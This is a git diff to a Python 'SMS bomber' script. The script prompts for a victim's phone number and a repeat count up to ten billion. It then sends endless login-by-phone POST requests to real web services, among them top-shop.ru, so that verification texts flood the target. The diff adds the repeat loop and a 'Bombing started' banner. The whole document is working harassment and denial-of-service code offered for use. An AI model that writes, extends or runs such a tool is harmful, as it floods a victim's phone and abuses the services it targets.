@@ -1,10 +1,10 @@
 import requests
 import threading
 
-print('001000010101010101010101010-----SmSbo-Mb')
+print('-----SmSbo-Mb-------')
 print('')
-a = str(input('Enter phone number in format 7916********..'))
-send_for_number(a)
+a = str(input('Enter phone number in format 7916********.. : '))
+b = int(input('Enter amount of smsbombspams (from 1 to 10000000000): '))
 def send_for_number(phone):
  while True:
   request_timeout = 0.0000002
@@ -224,3 +224,9 @@ def send_for_number(phone):
    topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data = {'phone': topPHONE})
   except Exception as e:
    pass
+
+starting = 0
+while (starting<b):
+ print('Bombing started [*] started')
+ send_for_number(a)
+ starting +=1
